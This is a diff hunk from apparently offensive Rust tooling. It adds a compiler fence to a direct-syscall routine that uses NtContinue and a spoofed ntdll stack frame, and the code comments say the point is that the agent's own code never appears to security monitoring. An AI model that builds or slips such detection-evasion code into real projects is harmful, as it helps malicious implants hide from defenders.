@@ -968,6 +968,12 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                 // executes will show ctx.Rsp→spoof_frame (ntdll) as the
                 // user-mode return site — agent code never appears.
                 let nt_status: i32;
+                // Ensure all prior writes to the stack argument area
+                // (spoof_frame_buf) and the CONTEXT structure are visible
+                // before the asm! block dispatches the NtContinue syscall.
+                // Without this fence the compiler could, in principle,
+                // reorder the raw-pointer stores past the asm! boundary.
+                std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
                 unsafe {
                     asm!(
                         // Fill in the continuation address at spoof_frame_buf[1].
